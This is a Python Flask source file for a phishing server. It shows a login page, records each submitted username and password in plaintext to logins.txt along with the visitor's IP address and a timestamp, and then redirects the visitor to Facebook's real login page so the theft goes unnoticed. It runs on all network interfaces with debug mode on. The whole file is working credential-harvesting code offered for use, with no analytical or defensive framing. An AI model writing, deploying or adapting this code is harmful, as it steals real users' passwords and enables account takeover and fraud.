import os
from flask import Flask, request, render_template, redirect
from datetime import datetime

# Set the path to the templates folder
app = Flask(__name__, template_folder='../templates')


@app.route('/')
def index():
    # Render the login page
    return render_template('index.html')


@app.route('/process_login', methods=['POST'])
def process_login():
    # Retrieve form data
    username = request.form.get('username')
    password = request.form.get('password')
    user_ip = request.remote_addr

    # Validate form fields
    if not username or not password:
        return "Please fill in all fields!", 400

    # Log user data (username, password, and IP address) with a timestamp
    with open('logins.txt', 'a') as f:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        f.write(f"[{timestamp}] IP: {user_ip} | {username}:{password}\n")

    # Redirect the user to the original login page (e.g., Facebook)
    return redirect("https://www.facebook.com/login", code=302)


if __name__ == '__main__':
    # Run the Flask app on all network interfaces and port 5000
    app.run(host='0.0.0.0', port=5000, debug=True)
